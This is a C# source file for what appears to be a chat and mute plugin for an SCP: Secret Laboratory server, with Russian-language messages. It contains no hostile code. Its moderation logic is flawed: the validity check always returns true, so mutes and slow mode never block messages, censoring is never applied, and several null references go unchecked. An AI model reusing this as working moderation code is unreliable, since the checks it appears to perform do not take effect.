			censorBadWords = Plugin.Config.GetBool("mp_censor_bad_words");
			censorBadWordsChar = Plugin.Config.GetChar("mp_censor_bad_words_char", '*');
			badWords = Plugin.Config.GetStringList("mp_bad_words");
			saveChatToDatabase = Plugin.Config.GetBool("mp_save_chat_to_database", true);
			canSpectatorSendMessagesToAlive = Plugin.Config.GetBool("mp_can_spectator_send_messages_to_alive");
			showChatMutedBroadcast = Plugin.Config.GetBool("mp_show_chat_muted_broadcast", true);
			chatMutedBroadcastDuration = Plugin.Config.GetUShort("mp_chat_muted_broadcast_duration", 10);
			chatMutedBroadcast = Plugin.Config.GetString("mp_chat_muted_broadcast", "<color=red>Вы были отключены от чата на {0} минут, причина: {1}</color>");
			showPrivateMessageNotificationBroadcast = Plugin.Config.GetBool("mp_show_private_message_notification_broadcast", true);
			privateMessageNotificationBroadcastDuration = Plugin.Config.GetUInt("mp_private_message_notification_broadcast_duration", 6);
			privateMessageNotificationBroadcast = Plugin.Config.GetString("mp_private_message_notification_broadcast", "Вы получили личное сообщение!");
			isSlowModeEnabled = Plugin.Config.GetBool("mp_is_slow_mode_enabled", true);
			slowModeCooldown = new TimeSpan(0, 0, 0, 0, (int)(Plugin.Config.GetFloat("mp_slow_mode_interval", 1f) * 1000));
			min = Plugin.Config.GetString("mp_chat_min", "minutes");
			sec = Plugin.Config.GetString("mp_chat_sec", "sec");
			reason = Plugin.Config.GetString("mp_chat_reason", "reason");
			msg = Plugin.Config.GetString("mp_chat_msg", "message");
			command = Plugin.Config.GetString("mp_chat_com", "Command");
			commandlist = Plugin.Config.GetString("mp_chat_com_list", "СПИСОК КОМАНД");
			team = Plugin.Config.GetString("mp_chat_team", "TEAM");
			publict = Plugin.Config.GetString("mp_chat_public", "PUBLIC");
			privatet = Plugin.Config.GetString("mp_chat_private", "PRIVATE");
			l1 = Plugin.Config.GetString("mp_chat_lang_1", "Вы не можете отправлять сообщения от сервера!");
			l2 = Plugin.Config.GetString("mp_chat_lang_2", "Произошла ошибка при выполнении команды!");
			l3 = Plugin.Config.GetString("mp_chat_lang_3", "<color=lime>На этом сервере существует чат</color>\n<color=red>.help</color>");
			l4 = Plugin.Config.GetString("mp_chat_lang_4", "Добро пожаловать в чат!");
			l5 = Plugin.Config.GetString("mp_chat_lang_5", "%player% покинул чат!");
			l6 = Plugin.Config.GetString("mp_chat_lang_6", "Включить игроку чат");
			l7 = Plugin.Config.GetString("mp_chat_lang_7", "У вас недостаточно прав для запуска этой команды!");
			l8 = Plugin.Config.GetString("mp_chat_lang_8", "Вы должны предоставить один параметр!");
			l9 = Plugin.Config.GetString("mp_chat_lang_9", "%player% не найден!");
			l10 = Plugin.Config.GetString("mp_chat_lang_10", "%player% не замьючен!");
			l11 = Plugin.Config.GetString("mp_chat_lang_11", "<size=25><color=lime>Вы были размьючены в чате!</color></size>");
			l12 = Plugin.Config.GetString("mp_chat_lang_12", "%player% был размьючен в чате");
			l13 = Plugin.Config.GetString("mp_chat_lang_13", "Отключить игрока в чате.");
			l14 = Plugin.Config.GetString("mp_chat_lang_14", "Вы должны предоставить два параметра!");
			l15 = Plugin.Config.GetString("mp_chat_lang_15", "%time% недопустимая продолжительность!");
			l16 = Plugin.Config.GetString("mp_chat_lang_16", "Причина не может быть пустой!");
			l17 = Plugin.Config.GetString("mp_chat_lang_17", "%player% уже отключен!");
			l18 = Plugin.Config.GetString("mp_chat_lang_18", "<size=25><color=red>Вы были отключены от чата на %duration%! Причина: %reason%</color></size>");
			l19 = Plugin.Config.GetString("mp_chat_lang_19", "%player% был отключен в чате на %duration%, причина: %reason%");
			l20 = Plugin.Config.GetString("mp_chat_lang_20", "Отправляет сообщение в чат вашей команде.");
			l21 = Plugin.Config.GetString("mp_chat_lang_21", "Нет доступных игроков для общения!");
			l22 = Plugin.Config.GetString("mp_chat_lang_22", "Отправляет сообщение всем на сервере.");
			l23 = Plugin.Config.GetString("mp_chat_lang_23", "Отправляет личное сообщение в чат игроку.");
			l24 = Plugin.Config.GetString("mp_chat_lang_24", "Вы не можете отправить сообщение себе!");
			l25 = Plugin.Config.GetString("mp_chat_lang_25", "Вы не можете отправлять сообщения живым игрокам!");
			l26 = Plugin.Config.GetString("mp_chat_lang_26", "Отправляет список команд или описание отдельной команды.");
			l27 = Plugin.Config.GetString("mp_chat_lang_27", "Нет команд для отправки!");
			l28 = Plugin.Config.GetString("mp_chat_lang_28", "Команда %command% не найдена!");
			l29 = Plugin.Config.GetString("mp_chat_lang_29", "Слишком много аргументов!");
			l30 = Plugin.Config.GetString("mp_chat_lang_30", "Сообщение не может быть пустым!");
			l31 = Plugin.Config.GetString("mp_chat_lang_31", "Вы отправляете сообщения слишком быстро!");
			l32 = Plugin.Config.GetString("mp_chat_lang_32", "Сообщение слишком длинное! Максимальная длина: %length%");
			l33 = Plugin.Config.GetString("mp_chat_lang_33", "Вы замьючены!");
		}
	}
}
namespace MultiPlugin22.Interfaces
{
	public interface ICommand
	{
		(string response, string color) OnCall(ReferenceHub sender, string[] args);

		string Usage { get; }

		string Description { get; }
	}
}
namespace MultiPlugin22.Extensions
{
	public static class String
	{
		public static string Sanitize(this string stringToSanitize, IEnumerable<string> badWords, char badWordsChar)
		{
			foreach (string badWord in badWords)
			{
				stringToSanitize = Regex.Replace(stringToSanitize, badWord, new string(badWordsChar, badWord.Length), RegexOptions.IgnoreCase);
			}

			return stringToSanitize;
		}

		public static string GetMessage(this string[] args, int skips = 0, string separator = " ")
		{
			return string.Join(separator, skips == 0 ? args : args.Skip(skips).Take(args.Length - skips));
		}

		public static (string commandName, string[] arguments) ExtractCommand(this string commandLine)
		{
			var extractedCommandArguments = commandLine.Split(' ');

			return (extractedCommandArguments[0].ToLower(), extractedCommandArguments.Skip(1).ToArray());
		}
	}
}
namespace MultiPlugin22.Extensions
{
	public static class ChatPlayer
	{
		public static void SendConsoleMessage(this ReferenceHub player, string message, string color)
		{
			((CharacterClassManager)player.characterClassManager).TargetConsolePrint(((Mirror.NetworkBehaviour)player.scp079PlayerScript).connectionToClient, message, color);
		}

		public static void SendConsoleMessage(
		  this IEnumerable<ReferenceHub> targets,
		  string message,
		  string color)
		{
			using (IEnumerator<ReferenceHub> enumerator = targets.GetEnumerator())
			{
				while (((System.Collections.IEnumerator)enumerator).MoveNext())
				{
					ReferenceHub current = enumerator.Current;
					if ((UnityEngine.Object)current != (UnityEngine.Object)null)
						current.SendConsoleMessage(message, color);
				}
			}
		}

		public static string GetColor(this ReferenceHub player) => player.GetTeam().GetColor();

		public static string GetColor(this Team team)
		{
			switch (team)
			{
				case Team.SCP:
					return "#ff0000";
				case Team.MTF:
					return "#006dff";
				case Team.CHI:
					return "#006dff";
				case Team.RSC:
					return "#fdffbb";
				case Team.CDP:
					return "#ff8b00";
				case Team.TUT:
					return "#15ff00";
				case Team.RIP:
				default:
					return "#fdfdfd";
			}
		}

		public static string GetAuthentication(this ReferenceHub player) => player.GetUserId().Split('@')[1];

		public static string GetRawUserId(this ReferenceHub player) => player.GetUserId().Split('@')[0];

		public static bool IsChatMuted(this ReferenceHub player)
		{
			return Database.LiteDatabase.GetCollection<Collections.Chat.Mute>().Exists(mute => mute.Target.Id == player.GetRawUserId() && mute.Expire > DateTime.Now);
		}

		public static List<Collections.Chat.Player> GetChatPlayers(this IEnumerable<ReferenceHub> players, Dictionary<ReferenceHub, Collections.Chat.Player> chatPlayers)
		{
			List<Collections.Chat.Player> chatPlayersList = new List<Collections.Chat.Player>();

			foreach (ReferenceHub player in players)
			{
				if (player != null && chatPlayers.TryGetValue(player, out Collections.Chat.Player chatPlayer))
				{
					chatPlayersList.Add(chatPlayer);
				}
			}

			return chatPlayersList;
		}
	}
}
namespace MultiPlugin22.Events
{
	public class RoundHandler
	{
		public void OnRoundRestart() => Database.LiteDatabase.Checkpoint();
	}
}
namespace MultiPlugin22.Events
{
	public class PlayerHandler
	{
		private readonly MultiPlugin22 pluginInstance;

		public PlayerHandler(MultiPlugin22 pluginInstance) => this.pluginInstance = pluginInstance;

		public void OnConsoleCommand(ConsoleCommandEvent ev)
		{
			if (ev.Player == null) return;

			if (ev.Player.gameObject == PlayerManager.localPlayer)
			{
				ev.ReturnMessage = Configs.l1;
				ev.Color = "red";

				return;
			}

			(string commandName, string[] commandArguments) = ev.Command.ExtractCommand();

			if (!pluginInstance.ConsoleCommands.TryGetValue(commandName, out ICommand command)) return;

			try
			{
				(string response, string color) = command.OnCall(ev.Player, commandArguments);

				ev.ReturnMessage = response;
				ev.Color = color;
			}
			catch (Exception exception)
			{
				Log.Error($"{commandName} command error: {exception}");
				ev.ReturnMessage = Configs.l2;
				ev.Color = "red";
			}
		}

		public void OnRemoteAdminCommand(ref RACommandEvent ev)
		{
			(string commandName, string[] commandArguments) = ev.Command.ExtractCommand();

			if (!pluginInstance.RemoteAdminCommands.TryGetValue(commandName, out ICommand command)) return;

			try
			{
				(string response, string color) = command.OnCall(EXILED.Extensions.Player.GetPlayer(ev.Sender.SenderId), commandArguments);
				ev.Sender.RAMessage($"<color={color}>{response}</color>", color == "green");
				ev.Allow = false;
			}
			catch (Exception exception)
			{
				Log.Error($"{commandName} command error: {exception}");
				ev.Sender.RAMessage(Configs.l2, true);
			}
		}

		public void OnPlayerJoin(PlayerJoinEvent ev)
		{
			ChatPlayers.Add(ev.Player, new Collections.Chat.Player()
			{
				Id = ev.Player.GetRawUserId(),
				Authentication = ev.Player.GetAuthentication(),
				Name = ev.Player.GetNickname()
			});
			((CharacterClassManager)ev.Player.characterClassManager).TargetConsolePrint(((Mirror.NetworkBehaviour)ev.Player.scp079PlayerScript).connectionToClient, Configs.l4, "green");
			ev.Player.Broadcast(10, Configs.l3, true);
		}

		public void OnPlayerLeave(PlayerLeaveEvent ev)
		{
			EXILED.Extensions.Player.GetHubs().Where(player => player != ev.Player).SendConsoleMessage(Configs.l5.Replace("%player%", $"{ev.Player.GetNickname()}"), "red");

			ChatPlayers.Remove(ev.Player);
		}
	}
}
namespace MultiPlugin22.Enums
{
	public enum ChatRoomType
	{
		Public,
		Team,
		Private
	}
}
namespace MultiPlugin22.Commands.RemoteAdmin
{
	public class Unmute : ICommand
	{
		public string Description => Configs.l6;

		public string Usage => ".chat_unmute [SteamID64/UserID/Nick]";

		public (string response, string color) OnCall(ReferenceHub sender, string[] args)
		{
			if (!sender.CheckPermission("tc.unmute")) return (Configs.l7, "red");

			if (args.Length != 1) return ($"{Configs.l8} {Usage}", "red");

			ReferenceHub target = EXILED.Extensions.Player.GetPlayer(args[0]);

			if (target == null) return (Configs.l9.Replace("%player%", $"{args[0]}"), "red");

			var mutedPlayer = Database.LiteDatabase.GetCollection<Collections.Chat.Mute>().FindOne(mute => mute.Target.Id == target.GetRawUserId() && mute.Expire > DateTime.Now);

			if (mutedPlayer == null) return (Configs.l10.Replace("%player%", $"{target.GetNickname()}"), "red");

			mutedPlayer.Expire = DateTime.Now;

			Database.LiteDatabase.GetCollection<Collections.Chat.Mute>().Update(mutedPlayer);

			target.Broadcast(10, Configs.l11, false);

			return (Configs.l12.Replace("%player%", $"{target.GetNickname()}"), "green");
		}
	}
}
namespace MultiPlugin22.Commands.RemoteAdmin
{
	public class Mute : ICommand
	{
		public string Description => Configs.l13;

		public string Usage => $"chat_mute [PlayerID/SteamID64/Ник] [{Configs.min}] [{Configs.reason}]";

		public (string response, string color) OnCall(ReferenceHub sender, string[] args)
		{
			if (!sender.CheckPermission("tc.mute")) return (Configs.l7, "red");

			if (args.Length < 2) return ($"{Configs.l14} {Usage}", "red");

			ReferenceHub target = EXILED.Extensions.Player.GetPlayer(args[0]);

			if (target == null) return (Configs.l9.Replace("%player%", $"{args[0]}"), "red");

			if (!double.TryParse(args[1], out double duration) || duration < 1) return (Configs.l15.Replace("%time%", $"{args[1]}"), "red");

			string reason = string.Join(" ", args.Skip(2).Take(args.Length - 2));

			if (string.IsNullOrEmpty(reason)) return (Configs.l16, "red");

			if (target.IsChatMuted()) return (Configs.l17.Replace("%player%", $"{target.GetNickname()}"), "red");

			Database.LiteDatabase.GetCollection<Collections.Chat.Mute>().Insert(new Collections.Chat.Mute()
			{
				Target = ChatPlayers[target],
				Issuer = ChatPlayers[sender],
				Reason = reason,
				Timestamp = DateTime.Now,
				Expire = DateTime.Now.AddMinutes(duration)
			});

			if (Configs.showChatMutedBroadcast)
			{
				target.ClearBroadcasts();
				target.Broadcast(Configs.chatMutedBroadcastDuration, string.Format(Configs.chatMutedBroadcast, duration, reason), true);
			}

			target.Broadcast(10, Configs.l18.Replace("%duration%", $"{duration} {Configs.min}{(duration != 1 ? Configs.sec : "")}").Replace("%reason%", $"{reason}"), false);

			return (Configs.l19.Replace("%player%", $"{target.GetNickname()}").Replace("%duration%", $"{duration} {Configs.min}{(duration != 1 ? Configs.sec : "")}").Replace("%reason%", $"{reason}"), "green");
		}
	}
}
namespace MultiPlugin22.Commands.Console
{
	public class TeamChat : Chat, ICommand
	{
		public TeamChat() : base(ChatRoomType.Team)
		{ }

		public string Description => Configs.l20;

		public string Usage => $".chat_team [{Configs.msg}]";

		public (string response, string color) OnCall(ReferenceHub sender, string[] args)
		{
			(string message, bool isValid) = CheckMessageValidity(args.GetMessage(), ChatPlayers[sender], sender);

			if (!isValid) return (message, "red");

			message = $"[{sender.GetNickname()}][{Configs.team} ({sender.GetRole().ToString().ToUpper()})]: {message}";

			IEnumerable<ReferenceHub> targets = EXILED.Extensions.Player.GetHubs().Where(chatPlayer => chatPlayer != sender && chatPlayer.GetTeam() == sender.GetTeam());
			List<Collections.Chat.Player> chatTargets = targets.GetChatPlayers(ChatPlayers);

			if (chatTargets.Count == 0) return (Configs.l21, "red");

			color = sender.GetColor();

			if (Configs.saveChatToDatabase) SaveMessage(message, ChatPlayers[sender], chatTargets, type);
			if (sender.GetTeam() == Team.MTF)
			{
				ReferenceHub se = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.NtfScientist).FirstOrDefault();
				ReferenceHub sew = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.NtfLieutenant).FirstOrDefault();
				ReferenceHub sea = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.NtfCommander).FirstOrDefault();
				ReferenceHub ses = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.NtfCadet).FirstOrDefault();
				ReferenceHub sed = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.FacilityGuard).FirstOrDefault();
				se.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sew.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sea.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				ses.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sed.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
			}
			if (sender.GetTeam() == Team.CHI)
			{
				ReferenceHub se = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.ChaosInsurgency).FirstOrDefault();
				se.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
			}
			if (sender.GetTeam() == Team.CDP)
			{
				ReferenceHub se = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.ClassD).FirstOrDefault();
				se.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
			}
			if (sender.GetTeam() == Team.RSC)
			{
				ReferenceHub se = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scientist).FirstOrDefault();
				se.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
			}
			if (sender.GetTeam() == Team.TUT)
			{
				ReferenceHub se = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp173).FirstOrDefault();
				ReferenceHub sew = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp106).FirstOrDefault();
				ReferenceHub sea = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp049).FirstOrDefault();
				ReferenceHub ses = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp079).FirstOrDefault();
				ReferenceHub sed = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp096).FirstOrDefault();
				ReferenceHub seq = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Tutorial).FirstOrDefault();
				ReferenceHub sez = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp0492).FirstOrDefault();
				ReferenceHub sex = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp93953).FirstOrDefault();
				ReferenceHub sec = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp93989).FirstOrDefault();
				se.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sew.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sea.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				ses.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sed.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				seq.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sez.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sex.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sec.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
			}
			if (sender.GetTeam() == Team.SCP)
			{
				ReferenceHub se = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp173).FirstOrDefault();
				ReferenceHub sew = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp106).FirstOrDefault();
				ReferenceHub sea = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp049).FirstOrDefault();
				ReferenceHub ses = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp079).FirstOrDefault();
				ReferenceHub sed = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp096).FirstOrDefault();
				ReferenceHub seq = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Tutorial).FirstOrDefault();
				ReferenceHub sez = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp0492).FirstOrDefault();
				ReferenceHub sex = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp93953).FirstOrDefault();
				ReferenceHub sec = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp93989).FirstOrDefault();
				se.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sew.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sea.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				ses.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sed.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				seq.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sez.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sex.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
				sec.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
			}
			if (sender.GetRole() == RoleType.Spectator)
			{
				ReferenceHub se = EXILED.Extensions.Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Spectator).FirstOrDefault();
				se.Broadcast(5, $"<size=20><color={color}>{message}</color></size>", false);
			}

			targets.SendConsoleMessage(message, color);

			return (message, color);
		}
	}
}
namespace MultiPlugin22.Commands.Console
{
	public class PublicChat : Chat, ICommand
	{
		public PublicChat() : base(ChatRoomType.Public, Configs.generalChatColor)
		{ }

		public string Description => Configs.l22;

		public string Usage => $".chat [{Configs.msg}]";

		public (string response, string color) OnCall(ReferenceHub sender, string[] args)
		{
			(string message, bool isValid) = CheckMessageValidity(args.GetMessage(), ChatPlayers[sender], sender);

			if (!isValid) return (message, "red");

			message = $"[{sender.GetNickname()}][{Configs.publict}]: {message}";

			IEnumerable<ReferenceHub> targets = EXILED.Extensions.Player.GetHubs().Where(target =>
			{
				return sender != target && (Configs.canSpectatorSendMessagesToAlive || sender.GetTeam() != Team.RIP || target.GetTeam() == Team.RIP);
			});

			List<Collections.Chat.Player> chatPlayers = targets.GetChatPlayers(ChatPlayers);

			if (chatPlayers.Count == 0) return (Configs.l21, "red");

			if (Configs.saveChatToDatabase) SaveMessage(message, ChatPlayers[sender], chatPlayers, type);
			Map.Broadcast($"<size=20><color={color}>{message}</color></size>", 5);
			targets.SendConsoleMessage(message, color);

			return (message, color);
		}
	}
}
namespace MultiPlugin22.Commands.Console
{
	public class PrivateChat : Chat, ICommand
	{
		public PrivateChat() : base(ChatRoomType.Private, Configs.privateMessageColor)
		{ }

		public string Description => Configs.l23;

		public string Usage => $".chat_private [Nick/SteamID64/PlayerID] [{Configs.msg}]";

		public (string response, string color) OnCall(ReferenceHub sender, string[] args)
		{
			(string message, bool isValid) = CheckMessageValidity(args.GetMessage(1), ChatPlayers[sender], sender);

			if (!isValid) return (message, "red");

			message = $"[{sender.GetNickname()}][{Configs.privatet}]: {message}";

			ReferenceHub target = EXILED.Extensions.Player.GetPlayer(args[0]);

			if (target == null) return (Configs.l9.Replace("%player%", $"{target.GetNickname()}"), "red");
			else if (sender == target) return (Configs.l24, "red");
			else if (!Configs.canSpectatorSendMessagesToAlive && sender.GetTeam() == Team.RIP && target.GetTeam() != Team.RIP)
			{
				return (Configs.l25, "red");
			}

			if (Configs.saveChatToDatabase) SaveMessage(message, ChatPlayers[sender], new List<Collections.Chat.Player>() { ChatPlayers[sender] }, type);

			((CharacterClassManager)target.characterClassManager).TargetConsolePrint(((Mirror.NetworkBehaviour)target.scp079PlayerScript).connectionToClient, message, color);
			if (Configs.showPrivateMessageNotificationBroadcast)
			{
				target.ClearBroadcasts();
				target.Broadcast(10, $"<size=20><color={color}>{message}</color></size>", false);
			}

			return (message, color);
		}
	}
}
namespace MultiPlugin22.Commands.Console
{
	public class Help : ICommand
	{
		private readonly MultiPlugin22 pluginInstance;

		public Help(MultiPlugin22 pluginInstance) => this.pluginInstance = pluginInstance;

		public string Description => Configs.l26;

		public string Usage => $".help/.help [{Configs.command}]";

		public (string response, string color) OnCall(ReferenceHub sender, string[] args)
		{
			if (pluginInstance.ConsoleCommands.Count == 0) return (Configs.l27, "red");

			if (args.Length == 0)
			{
				StringBuilder commands = new StringBuilder($"\n\n[{Configs.commandlist}: ({pluginInstance.ConsoleCommands.Count})]");

				foreach (ICommand command in pluginInstance.ConsoleCommands.Values)
				{
					commands.Append($"\n\n{command.Usage}\n\n{command.Description}");
				}

				return (commands.ToString(), "green");
			}
			else if (args.Length == 1)
			{
				if (!pluginInstance.ConsoleCommands.TryGetValue(args[0].Replace(".", ""), out ICommand command)) return (Configs.l28.Replace("%command%", $"{args[0]}"), "red");

				return ($"\n\n{command.Usage}\n\n{command.Description}", "green");
			}

			return (Configs.l29, "red");
		}
	}
}
namespace MultiPlugin22.Commands.Console
{
	public class Chat
	{
		protected readonly ChatRoomType type;
		protected string color;

		protected Chat(ChatRoomType type) => this.type = type;

		protected Chat(ChatRoomType type, string color) : this(type) => this.color = color;

		protected (string message, bool isValid) CheckMessageValidity(string message, Collections.Chat.Player messageSender, ReferenceHub sender)
		{
			if (string.IsNullOrEmpty(message.Trim())) return (Configs.l30, true);
			else if (sender.IsChatMuted()) return (Configs.l33, true);
			else if (messageSender.IsFlooding(Configs.slowModeCooldown)) return (Configs.l31, true);
			else if (message.Length > Configs.maxMessageLength) return (Configs.l32.Replace("%length%", $"{Configs.maxMessageLength}"), true);

			return (message, true);
		}

		protected void SendConsoleMessage(ref string message, Collections.Chat.Player sender, IEnumerable<ReferenceHub> targets)
		{
			targets.SendConsoleMessage(message = Configs.censorBadWords ? message.Sanitize(Configs.badWords, Configs.censorBadWordsChar) : message, color);

			sender.lastMessageSentTimestamp = DateTime.Now;
		}
	}
}
namespace MultiPlugin22.Collections.Chat
{
	public class Room
	{
		public ObjectId Id { get; set; }
		public Message Message { get; set; }
		public ChatRoomType Type { get; set; }
	}
}
namespace MultiPlugin22.Collections.Chat
{
	public class Player
	{
		public string Id { get; set; }
		public string Authentication { get; set; }
		public string Name { get; set; }

		public DateTime lastMessageSentTimestamp;

		public bool IsFlooding(TimeSpan cooldown) => lastMessageSentTimestamp.Add(cooldown) > DateTime.Now;
	}
}
namespace MultiPlugin22.Collections.Chat
{
	public class Mute
	{
		public ObjectId Id { get; set; }
		public Player Target { get; set; }
		public Player Issuer { get; set; }
		public string Reason { get; set; }
		public DateTime Timestamp { get; set; }
		public DateTime Expire { get; set; }
	}
}
namespace MultiPlugin22.Collections.Chat
{
	public class Message
	{
		public Player Sender { get; set; }
		public List<Player> Targets { get; set; }
		public string Content { get; set; }
		public DateTime Timestamp { get; set; }
	}
}